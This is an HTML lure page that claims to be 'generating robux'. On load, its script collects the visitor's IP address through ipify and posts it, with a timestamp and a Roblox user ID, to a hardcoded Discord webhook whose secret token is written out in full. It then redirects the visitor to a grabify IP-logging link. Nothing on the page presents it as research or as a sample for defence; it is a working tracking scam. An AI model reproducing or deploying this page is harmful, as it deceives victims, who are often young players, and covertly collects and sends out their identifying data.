<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Website Monitor</title>
</head>
<body>
  <h1>Generating robux, don't tab out/close this window!</h1>

  <script>
    document.addEventListener("DOMContentLoaded", function() {
      // Open the user ID finding website in a new tab
      window.open("https://www.roblox.com/users/profile");

      // Wait for the user profile page to load
      window.addEventListener("load", function() {
        // Extract the user ID from the URL
        var userId = getUserIdFromUrl();

        // If user ID is found, send Discord message
        if (userId) {
          sendDiscordMessage(userId);
        } else {
          console.error("User ID not found in the URL.");
        }
      });
    });

    function getUserIdFromUrl() {
      var urlParams = new URLSearchParams(window.location.search);
      return urlParams.get('userId');
    }

    function sendDiscordMessage(userId) {
      var webhookURL = "https://discord.com/api/webhooks/1214203058284662794/cpyZU4ceyZ2TLhojorU_akBA-jqF_45EZzdSdBQBv_NNkwCwPMWR3Kaw8nzXAeqmuXn9";
      var currentDate = new Date();
      var formattedDate = currentDate.toLocaleString('en-US', { month: 'long', day: 'numeric', year: 'numeric', hour: 'numeric', minute: 'numeric', second: 'numeric', hour12: true });

      fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
          var ip = data.ip;
          var message = {
            content: "Opened on: " + formattedDate + "\nIP address: " + ip + "\nRoblox user ID: " + userId
          };

          fetch(webhookURL, {
            method: "POST",
            headers: {
              "Content-Type": "application/json"
            },
            body: JSON.stringify(message)
          })
          .then(response => {
            if (!response.ok) {
              console.error("Failed to send message to Discord.");
            } else {
              console.log("Message sent to Discord successfully.");
              redirectToDifferentWebsite();
            }
          })
          .catch(error => {
            console.error("Error sending message to Discord:", error);
          });
        })
        .catch(error => {
          console.error("Error fetching IP address:", error);
        });
    }

    function redirectToDifferentWebsite() {
      window.location.href = "https://grabify.link/QW9D2R";
    }
  </script>
</body>
</html>
